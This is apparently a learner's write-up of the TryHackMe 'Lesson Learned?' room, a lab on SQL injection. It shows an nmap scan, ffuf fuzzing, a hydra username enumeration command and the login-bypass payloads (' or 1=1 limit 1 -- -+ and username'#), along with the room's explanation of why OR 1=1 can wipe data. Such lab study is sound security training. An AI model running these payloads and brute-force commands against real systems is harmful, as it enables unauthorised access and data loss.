---
parent: "[[CTFs - THM]]"
---
```bash
# PLATFORM          . THM
# CTF NAME          . Lesson Learned?
# DESCRIPTION       . Have you learned your lesson?
# DIFFICULTY        . Easy
# CTF LINK          . https://tryhackme.com/room/lessonlearned
```

```bash
sudo nmap -sSVC -T5 -p- 10.10.17.247 -oN ll
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 2e5489aef7914e336e1089539cf592db (RSA)
|   256 dd2ccafcb76514d488a36e557165f72f (ECDSA)
|_  256 2bc2d81bf47be5785356019a83f37981 (ED25519)
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-title: Lesson Learned?
|_http-server-header: Apache/2.4.54 (Debian)
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- There is only a login form on the website which I didn't want to attempt to bruteforce or try SQL Injection just yet, so I decided on enumeration.

```
ffuf -u http://10.10.17.247/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
```

```
manual                  [Status: 301, Size: 313, Words: 20, Lines: 10]
```

- This was just the Apache's 2.4 manual and I tried enumerating more sub directories thinking that maybe we get a hint or some useful info.

- However, I quickly realised I'm wasting time so I came back to the login form and tried some SQL injection.

- Using the `' or 1=1 limit 1 -- -+` payload, I received the following message

```
Oops! It looks like you injected an OR 1=1 or similar into the username field. This wouldn't have bypassed the login because every row in the users table was returned, and the login check only proceeds if one row matches the query.

However, your injection also made it into a DELETE statement, and now the flag is gone. Like, completely gone. You need to reset the box to restore it, sorry.

OR 1=1 is dangerous and should almost never be used for precisely this reason. Not even SQLmap uses OR unless you set --risk=3 (the maximum). Be better. Be like SQLmap.

Lesson learned?

P.S. maybe there is less destructive way to bypass the login...
```

- So this is the lesson, it seems. `OR 1=1` in SQL injection can lead to DELETE statements and to data losses.

- I've restarted the box and tried other payloads to bypass the login.

- Tried multiple payloads, but I didn't had any success (well, I didn't expect to. Tried other 'or' statements to see if they really delete the flag)

- Then, I tried to bypass the login assuming the username is `admin`, but I still had no succes, so either I'm missing something or `admin` doesn't exist.

- I fired up hydra to find out valid usernames on the  system

```
hydra -L /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt -p a 10.10.124.142 http-post-form "/:username=^USER^&password=^PASS^:Invalid username and password." -I -t 16

[80][http-post-form] host: 10.10.124.142   login: martin   password: a
[80][http-post-form] host: 10.10.124.142   login: patrick   password: a
[80][http-post-form] host: 10.10.124.142   login: stuart   password: a
[80][http-post-form] host: 10.10.124.142   login: marcus   password: a
[80][http-post-form] host: 10.10.124.142   login: kelly   password: a
[80][http-post-form] host: 10.10.124.142   login: arnold   password: a
[80][http-post-form] host: 10.10.124.142   login: Martin   password: a
[80][http-post-form] host: 10.10.124.142   login: karen   password: a
```

- This is working because we're getting `Invalid username and password.` when inputting wrong username:password, but when only the password is wrong, we're getting `Invalid password.` instead.

- Knowing this, we can try SQL Injection as follows: `username'#`.

```
Well done! You bypassed the login without deleting the flag!

If you're confused by this message, you probably didn't even try an SQL injection using something like OR 1=1. Good for you, you didn't need to learn the lesson.

For everyone else who had to reset the box...lesson learned?

Using OR 1=1 is risky and should rarely be used in real world engagements. Since it loads all rows of the table, it may not even bypass the login, if the login expects only 1 row to be returned. Loading all rows of a table can also cause performance issues on the database. However, the real danger of OR 1=1 is when it ends up in either an UPDATE or DELETE statement, since it will cause the modification or deletion of every row.

For example, consider that after logging a user in, the application re-uses the username input to update a user's login status: UPDATE users SET online=1 WHERE username='<username>';

A successful injection of OR 1=1 here would cause every user to appear online. A similar DELETE statement, possibly to delete prior session data, could wipe session data for all users of the application.

Consider using AND 1=1 as an alternative, with a valid input (in this case a valid username) to test / confirm SQL injection. 
```

